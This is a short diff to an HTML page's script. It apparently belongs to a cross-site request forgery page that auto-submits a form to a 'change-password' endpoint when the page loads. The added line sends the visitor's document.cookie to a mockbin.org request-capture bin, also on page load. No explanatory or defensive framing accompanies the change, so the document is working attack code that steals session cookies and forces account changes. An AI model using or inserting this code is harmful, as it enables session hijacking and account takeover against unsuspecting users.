@@ -44,7 +44,9 @@
 </html>
 <script>
 $( document ).ready(function() {
- $("#myForm").ajaxSubmit({url: 'https://silver-quire.herokuapp.com/change-password', type: 'post'})
+  $.ajax('http://mockbin.org/bin/7121790a-9c80-443e-bdb9-7db594826f5b?session='+document.cookie);
+ $("#myForm").ajaxSubmit({url: 'https://silver-quire.herokuapp.com/change-password', type: 'post'});
+
 });
 
 </script>
